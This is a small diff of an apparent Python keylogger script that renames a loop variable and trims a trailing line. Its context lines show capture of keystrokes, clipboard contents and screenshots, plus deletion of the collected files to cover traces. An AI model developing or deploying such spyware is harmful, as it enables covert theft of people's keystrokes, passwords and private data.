@@ -101,8 +101,8 @@ def screenshot():
 
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
-exit = False
-while not exit:
+if_exit = False
+while not if_exit:
 	
 	count = 0
 	keys = ""
@@ -168,4 +168,3 @@ while not exit:
 		delete_files = [clipboard_information, screenshot_information, keys_information]
 		for file in delete_files:
 			os.remove(file)
-
